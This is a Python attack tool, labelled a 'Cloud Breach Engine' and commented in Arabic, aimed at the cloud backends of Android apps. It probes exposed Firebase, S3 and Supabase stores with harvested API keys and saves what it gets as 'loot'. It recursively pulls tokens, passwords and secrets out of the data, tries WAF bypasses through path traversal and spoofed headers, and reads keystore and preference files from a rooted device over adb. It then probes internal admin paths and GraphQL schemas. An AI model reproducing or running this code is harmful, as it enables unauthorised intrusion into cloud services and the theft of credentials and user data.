#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HAYO Cipher-7 — Cloud Breach Engine (cloud_breach_engine.py)
==============================================================
محرك اختراق السحابة: يتوغل في الشبكات السحابية ويسحب البيانات
  - Firebase/Firestore exploitation
  - AWS S3 bucket enumeration
  - GCP/Google API exploitation
  - Supabase penetration
  - Cloud firewall bypass techniques
  - Data exfiltration from cloud services
  - Encrypted key extraction
"""
import json
import os
import re
import subprocess
import sys
import time
from datetime import datetime

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
B = "\033[94m"; M = "\033[95m"; X = "\033[0m"

HERE = os.path.dirname(os.path.abspath(__file__))

try:
    import requests
except ImportError:
    requests = None


class CloudBreachEngine:
    """
    محرك اختراق السحابة - يخترق الخدمات السحابية ويستخرج البيانات
    """
    
    def __init__(self, package, store=None, device="emulator-5554"):
        self.package = package
        self.store = store
        self.device = device
        self.adb = r"C:\Users\PT\Downloads\platform-tools\adb.exe"
        self.loot_dir = os.path.join(HERE, "loot", "cloud", package)
        os.makedirs(self.loot_dir, exist_ok=True)
        
        self.cloud_data = {}
        self.extracted_keys = {}
        self.firebase_data = {}
        self.aws_data = {}
        self.exploited_services = []
        self.breached_endpoints = []
        self.bypassed_firewalls = []
        
        self.session = requests.Session() if requests else None
        
    def log(self, msg, color=C):
        print(f"{color}[C️ CLOUD] {msg}{X}")

    def _adb(self, cmd):
        full = f"{self.adb} -s {self.device} {cmd}"
        try:
            r = subprocess.run(full, shell=True, capture_output=True, text=True, timeout=30)
            return r.stdout.strip(), r.stderr.strip()
        except Exception as e:
            return "", str(e)

    def exploit_firebase(self, endpoints, secrets):
        """اختراق Firebase - استغلال قواعد البيانات المكشوفة"""
        self.log("بدء هجوم Firebase...", Y)
        results = {}
        
        firebase_urls = [ep for ep in endpoints if "firebase" in ep.lower()]
        api_keys = [v for k, vals in secrets.items() for v in vals if "AIza" in str(v)]
        
        # If we have Firebase URLs, try to access them
        for url in firebase_urls[:5]:
            self.log(f"فحص Firebase: {url}", C)
            
            # Firebase REST API
            base = url.rstrip('/').replace('firebaseio.com', 'firebaseio.com')
            if not base.endswith('.json'):
                base += '.json'
            
            if self.session:
                try:
                    r = self.session.get(base, timeout=15)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            results[base] = data
                            self.firebase_data[base] = data
                            self.log(f"  [+] Firebase مكشوف! {len(str(data))} bytes", G)
                            self.breached_endpoints.append(base)
                            
                            # Save data
                            safe_name = re.sub(r'[^\w]', '_', base)[:50]
                            path = os.path.join(self.loot_dir, f"firebase_{safe_name}.json")
                            with open(path, 'w', encoding='utf-8') as f:
                                json.dump(data, f, ensure_ascii=False, indent=2)
                            
                            # Extract any sensitive data
                            self._extract_from_firebase(data, base)
                        except:
                            self.log(f"  استجابة غير JSON: {r.status_code}", Y)
                    elif r.status_code == 404:
                        self.log(f"  Firebase غير موجود", Y)
                    else:
                        self.log(f"  HTTP {r.status_code}", Y)
                except Exception as e:
                    self.log(f"  خطأ: {e}", R)
            
            # Try with API key
            for key in api_keys[:2]:
                try:
                    auth_url = f"{base}?auth={key}"
                    r = self.session.get(auth_url, timeout=15)
                    if r.status_code == 200:
                        data = r.json()
                        results[f"{base}?auth={key[:8]}..."] = data
                        self.log(f"  [+] Firebase متاح بالمفتاح! {key[:15]}...", G)
                        self._extract_from_firebase(data, base)
                except:
                    pass
        
        # Try Firebase Realtime Database REST API directly
        for key in api_keys[:3]:
            for project_id in self._extract_possible_ids():
                fb_urls = [
                    f"https://{project_id}.firebaseio.com/.json",
                    f"https://{project_id}.firebasedatabase.app/.json",
                    f"https://{project_id}.firebaseio.com/.json?auth={key}",
                ]
                for fb_url in fb_urls:
                    try:
                        r = self.session.get(fb_url, timeout=10)
                        if r.status_code == 200:
                            data = r.json()
                            results[fb_url] = data
                            self.log(f"  [+] Firebase DB مكشوف: {fb_url}", G)
                            self.breached_endpoints.append(fb_url)
                    except:
                        pass
        
        if results:
            self.exploited_services.append("firebase")
            if self.store:
                self.store.add("note", "firebase_exploited", source="cloud_breach")
        
        return results

    def _extract_possible_ids(self):
        """استخراج project IDs محتملة من البيانات"""
        ids = set()
        if self.store:
            for f in self.store.query("cloud_id"):
                ids.add(f["value"])
            for f in self.store.query("secret"):
                val = f["value"]
                if "AIza" in val:
                    # Try to derive project from context
                    pass
            # Extract from package name
            pkg_parts = self.package.split('.')
            if len(pkg_parts) >= 2:
                ids.add(pkg_parts[1])
                ids.add('.'.join(pkg_parts[-2:]))
        return list(ids)

    def _extract_from_firebase(self, data, source):
        """استخراج الأسرار من بيانات Firebase"""
        self._recursive_extract(data, source)

    def _recursive_extract(self, data, source, path=""):
        """استخراج متكرر من البيانات المتداخلة"""
        if isinstance(data, dict):
            for key, val in data.items():
                new_path = f"{path}/{key}"
                if re.search(r'(token|key|secret|password|credential|api|auth|jwt|private)', key, re.I):
                    self.extracted_keys[key] = str(val)[:200]
                    self.log(f"  [+] مفتاح مكتشف: {key} = {str(val)[:40]}...", G)
                    if self.store:
                        self.store.add("secret", str(val), source="cloud_breach", note=key)
                if isinstance(val, (dict, list)):
                    self._recursive_extract(val, source, new_path)
        elif isinstance(data, list):
            for i, item in enumerate(data):
                if isinstance(item, (dict, list)):
                    self._recursive_extract(item, source, f"{path}[{i}]")

    def exploit_aws(self, endpoints, secrets):
        """اختراق AWS S3 buckets"""
        self.log("فحص AWS S3 buckets...", Y)
        results = {}
        
        aws_urls = [ep for ep in endpoints if "amazonaws.com" in ep or "s3" in ep]
        aws_keys = [v for k, vals in secrets.items() for v in vals if "AKIA" in str(v)]
        
        for url in aws_urls[:5]:
            self.log(f"فحص S3: {url}", C)
            if self.session:
                try:
                    r = self.session.get(url, timeout=15)
                    if r.status_code in (200, 206):
                        self.log(f"  [+] S3 مكشوف! HTTP {r.status_code}", G)
                        results[url] = {"status": r.status_code, "size": len(r.content)}
                        self.breached_endpoints.append(url)
                        
                        # Save content
                        safe = re.sub(r'[^\w]', '_', url)[:40]
                        with open(os.path.join(self.loot_dir, f"s3_{safe}.bin"), 'wb') as f:
                            f.write(r.content)
                except:
                    pass
        
        return results

    def exploit_supabase(self, endpoints, secrets):
        """اختراق Supabase"""
        self.log("فحص Supabase...", Y)
        results = {}
        
        supabase_urls = [ep for ep in endpoints if "supabase.co" in ep]
        
        for url in supabase_urls[:5]:
            if self.session:
                try:
                    # Try anon key access
                    r = self.session.get(url, timeout=15)
                    if r.status_code == 200:
                        results[url] = r.json() if 'application/json' in r.headers.get('content-type', '') else "binary"
                        self.log(f"  [+] Supabase مكشوف!", G)
                        self.breached_endpoints.append(url)
                except:
                    pass
        
        return results

    def bypass_firewall(self, endpoint):
        """اختراق جدران الحماية السحابية - WAF bypass techniques"""
        self.log(f"محاولة اختراق جدار الحماية: {endpoint}", M)
        
        if not self.session:
            return {}
        
        techniques = {
            "path_traversal": [
                f"{endpoint}/..;/admin",
                f"{endpoint}//admin//",
                f"{endpoint}/.%00/admin",
            ],
            "parameter_pollution": [
                f"{endpoint}?id=1&id=2",
                f"{endpoint}?admin=true&role=user",
            ],
            "header_bypass": {
                "X-Forwarded-For": "127.0.0.1",
                "X-Real-IP": "127.0.0.1",
                "X-Originating-IP": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Host": "localhost",
                "X-Forwarded-Host": "localhost",
            },
            "content_type_bypass": [
                ('application/json', '{"role":"admin"}'),
                ('application/xml', '<root><role>admin</role></root>'),
            ],
            "method_override": [
                ("POST", {"_method": "PUT"}),
                ("POST", {"_method": "DELETE"}),
                ("GET", {"X-HTTP-Method-Override": "PUT"}),
            ]
        }
        
        results = {}
        
        # 1. Path traversal
        for url in techniques["path_traversal"]:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code != 403 and r.status_code != 401:
                    self.log(f"  [+] تجاوز بـ Path: {r.status_code} -> {url[:60]}", G)
                    results[f"path_{url[:30]}"] = r.status_code
                    self.bypassed_firewalls.append(url)
            except:
                pass
        
        # 2. Header-based bypass
        for header, value in techniques["header_bypass"].items():
            try:
                r = self.session.get(endpoint, headers={header: value}, timeout=10)
                if r.status_code != 403:
                    self.log(f"  [+] تجاوز بـ Header {header}: {r.status_code}", G)
                    results[f"header_{header}"] = r.status_code
                    self.bypassed_firewalls.append(f"{endpoint} (header:{header})")
            except:
                pass
        
        # 3. HTTP method override
        for method, override in techniques["method_override"]:
            try:
                if method == "POST":
                    r = self.session.post(endpoint, data=override, timeout=10)
                else:
                    r = self.session.get(endpoint, headers=override, timeout=10)
                if r.status_code != 405 and r.status_code != 403:
                    self.log(f"  [+] تجاوز بـ Method: {r.status_code} ({method})", G)
                    results[f"method_{method}"] = r.status_code
            except:
                pass
        
        return results

    def extract_encrypted_keys_from_device(self):
        """استخراج المفاتيح المشفرة من جهاز المحاكي"""
        self.log("استخراج المفاتيح المشفرة من الجهاز...", Y)
        keys = {}
        
        # Android KeyStore
        out, _ = self._adb(f"shell su -c 'find /data/data/{self.package} -name \"*key*\" -o -name \"*keystore*\" 2>/dev/null'")
        if out:
            for path in out.split('\n'):
                path = path.strip()
                if path:
                    self.log(f"  ملف مفتاح: {path}", C)
                    data, _ = self._adb(f"shell su -c 'cat {path} 2>/dev/null | base64'")
                    keys[path] = data[:200] if data else "empty"
                    if self.store:
                        self.store.add("secret", f"keystore:{path}", source="cloud_breach", note="android_keystore")
        
        # Encrypted SharedPreferences
        out2, _ = self._adb(f"shell su -c 'find /data/data/{self.package} -name \"*.xml\" 2>/dev/null'")
        if out2:
            for path in out2.split('\n'):
                path = path.strip()
                if path:
                    data, _ = self._adb(f"shell su -c 'cat {path}'")
                    if data and re.search(r'(encrypted|aes|rsa|private|secret|key)', data, re.I):
                        self.log(f"  [+] بيانات مشفرة في: {path}", Y)
                        keys[f"encrypted_xml:{path}"] = data[:500]
        
        # SQLite encrypted databases
        out3, _ = self._adb(f"shell su -c 'find /data/data/{self.package} -name \"*.db\" -o -name \"*.sqlite\" 2>/dev/null'")
        if out3:
            for path in out3.split('\n'):
                path = path.strip()
                if path:
                    self.log(f"  قاعدة بيانات: {path}", C)
                    keys[f"db:{path}"] = path
        
        return keys

    def run_full_breach(self, endpoints, secrets):
        """تشغيل هجوم السحابة الكامل"""
        print(f"\n{M}{'='*60}{X}")
        print(f"{M}      محرك اختراق السحابة - Cloud Breach Engine{X}")
        print(f"{M}      Target: {self.package}{X}")
        print(f"{M}{'='*60}{X}\n")
        
        # 1. Firebase
        fb_results = self.exploit_firebase(endpoints, secrets)
        
        # 2. AWS
        aws_results = self.exploit_aws(endpoints, secrets)
        
        # 3. Supabase
        supabase_results = self.exploit_supabase(endpoints, secrets)
        
        # 4. Extract encrypted keys from device
        device_keys = self.extract_encrypted_keys_from_device()
        
        # 5. WAF bypass on discovered cloud endpoints
        waf_results = {}
        for ep in self.breached_endpoints[:3]:
            wr = self.bypass_firewall(ep)
            waf_results[ep] = wr
        
        # 6. Deep cloud penetration - try to access deeper network layers
        deep_results = self._deep_cloud_penetration()
        
        results = {
            "firebase": fb_results,
            "aws": aws_results,
            "supabase": supabase_results,
            "device_keys": device_keys,
            "waf_bypass": waf_results,
            "deep_penetration": deep_results,
            "breached_endpoints": self.breached_endpoints,
            "exploited_services": self.exploited_services,
            "extracted_keys": self.extracted_keys
        }
        
        # Save report
        report_path = os.path.join(self.loot_dir, "cloud_breach_report.json")
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(results, f, ensure_ascii=False, indent=2, default=str)
        
        print(f"\n{G}{'='*60}{X}")
        print(f"{G}  اختراق السحابة اكتمل!{X}")
        print(f"{G}  - خدمات مستغلة: {len(self.exploited_services)}{X}")
        print(f"{G}  - نقاط نهاية مخترقة: {len(self.breached_endpoints)}{X}")
        print(f"{G}  - مفاتيح مستخرجة: {len(self.extracted_keys)}{X}")
        print(f"{G}  - جدران حماية تم تجاوزها: {len(self.bypassed_firewalls)}{X}")
        print(f"{G}  - التقرير: {report_path}{X}")
        print(f"{G}{'='*60}{X}\n")
        
        # Feed into store
        if self.store:
            self.store.add("note", "cloud_breach_complete", source="cloud_breach")
        
        return results

    def _deep_cloud_penetration(self):
        """اختراق عميق للشبكة السحابية - الوصول للطبقات الداخلية"""
        self.log("بدء الاختراق العميق للشبكة السحابية...", M)
        results = {}
        
        # Try to find internal cloud APIs
        internal_patterns = [
            "internal", "admin", "api/v2", "api/v3", "private",
            "management", "console", "dashboard", "backend",
            "service", "internal-api", "api/admin", "graphql"
        ]
        
        for ep in self.breached_endpoints:
            base = re.sub(r'/\.json$', '', ep)
            base = re.sub(r'\?.*$', '', base)
            base = base.rstrip('/')
            
            for pattern in internal_patterns:
                url = f"{base}/{pattern}"
                if self.session:
                    try:
                        r = self.session.get(url, timeout=10)
                        if r.status_code in (200, 201, 202, 204):
                            self.log(f"  [+] عمق السحابة: {url} -> HTTP {r.status_code}", G)
                            results[url] = r.status_code
                            self.breached_endpoints.append(f"(deep){url}")
                            
                            # Try to read the response
                            try:
                                content = r.json()
                                self._recursive_extract(content, url)
                            except:
                                if len(r.text) < 10000:
                                    results[f"{url}_body"] = r.text[:500]
                    except:
                        pass
            
            # Try GraphQL introspection
            gql_url = f"{base}/graphql"
            if self.session:
                try:
                    r = self.session.post(gql_url, json={"query": "{__schema{types{name}}}"}, timeout=10)
                    if r.status_code == 200 and "__schema" in r.text:
                        self.log(f"  [+] GraphQL مكشوف! {gql_url}", G)
                        results[f"graphql_{gql_url}"] = r.json()
                except:
                    pass
        
        return results


if __name__ == "__main__":
    import argparse
    from intel_store import IntelStore
    
    ap = argparse.ArgumentParser()
    ap.add_argument("--package", "-p", required=True)
    ap.add_argument("--device", "-d", default="emulator-5554")
    ap.add_argument("--endpoints", help="JSON file with endpoints")
    ap.add_argument("--secrets", help="JSON file with secrets")
    args = ap.parse_args()
    
    store = IntelStore(args.package)
    engine = CloudBreachEngine(args.package, store=store, device=args.device)
    
    endpoints = []
    secrets = {}
    if args.endpoints and os.path.isfile(args.endpoints):
        with open(args.endpoints) as f:
            data = json.load(f)
            endpoints = data if isinstance(data, list) else data.get("endpoints", [])
    if args.secrets and os.path.isfile(args.secrets):
        with open(args.secrets) as f:
            secrets = json.load(f)
    
    engine.run_full_breach(endpoints, secrets)
    store.save()
